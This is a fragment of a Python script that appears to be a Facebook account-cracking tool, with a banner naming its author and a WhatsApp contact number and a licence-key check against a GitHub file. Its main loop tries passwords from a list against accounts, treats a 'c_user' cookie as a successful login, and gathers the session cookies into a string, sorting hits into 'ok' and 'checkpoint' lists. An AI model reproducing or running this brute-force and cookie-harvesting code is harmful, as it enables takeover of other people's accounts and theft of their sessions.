...
ha = current.day
today = date.today()
os.system('xdg-open https://youtube.com/@alitechnology5083')
logo =("""\033[0;92m
╔═══════════════════════════════════════════════════╗
##     ##    ###    ##     ## #### ##    ## \033[1;92m
###   ###   ## ##   ##     ##  ##  ###   ## \033[1;96m
...
##     ## ##     ## ##     ## #### ##    ## \033[1;92m                                          
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38mMR.ARAFAT\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> ARAFAT  MAHIN    ║  \033[1;97m
╠══[Github:=======================> \33[1;38marafat-mahin310   ║\33[1;34m
╠══[Whatsapp:=====================> 01925798757   ║\33[1;35m
...
a=requests.get(" https://github.com/arafat-mahin310/V-ViruX.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    os.system("clear")
    print
    print("Send Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801925798757')
    exit()  
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[AM-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
